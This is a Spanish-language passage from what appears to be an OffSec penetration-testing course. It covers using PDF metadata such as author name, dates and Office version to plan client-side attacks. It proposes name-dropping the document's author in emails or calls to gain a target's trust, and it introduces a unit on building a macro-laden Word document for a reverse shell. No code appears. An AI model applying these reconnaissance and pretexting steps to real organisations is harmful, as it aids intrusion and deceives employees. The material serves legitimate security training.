Las secciones _Crear fecha_ y _Modificar fecha_ revelan la antigüedad relativa del documento. Dado que estas fechas son relativamente recientes (al momento de escribir este artículo), tenemos un alto nivel de confianza en que esta es una buena fuente de metadatos.

La sección _Autor_ revela el nombre de un empleado interno. Podríamos usar nuestro conocimiento de esta persona para establecer mejor una relación de confianza al colocar su nombre casualmente en un correo electrónico o conversación telefónica específica. Esto es especialmente útil si el autor mantiene un perfil público relativamente pequeño.

El resultado revela además que el PDF se creó con Microsoft PowerPoint para Microsoft 365. Esta es información crucial para que podamos planificar nuestro ataque del lado del cliente, ya que ahora sabemos que el objetivo usa Microsoft Office y dado que no se menciona "macOS" o "para Mac" en cualquiera de las etiquetas de metadatos, es muy probable que se haya utilizado Windows para crear este documento.

Ahora podemos aprovechar los vectores de ataque del lado del cliente que van desde los componentes del sistema de Windows hasta los documentos maliciosos de Office.

<br />

#### 6.2. Explotando Microsoft Office.

Los ataques de ransomware han aumentado drásticamente en los últimos años. [1](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/exploiting-microsoft-office#fn1) En la mayoría de los casos, la infracción inicial involucró una macro maliciosa de Microsoft Office. Este es un vector de ataque común ya que Office es ubicuo y los documentos de Office se envían comúnmente por correo electrónico entre colegas.

En esta unidad de aprendizaje, primero analizaremos varias consideraciones de documentos de Office maliciosos en un escenario de ataque del lado del cliente. A continuación, recorreremos el proceso de instalación de Office y, por último, crearemos un documento de Word malicioso con macros incrustadas para obtener un shell inverso.

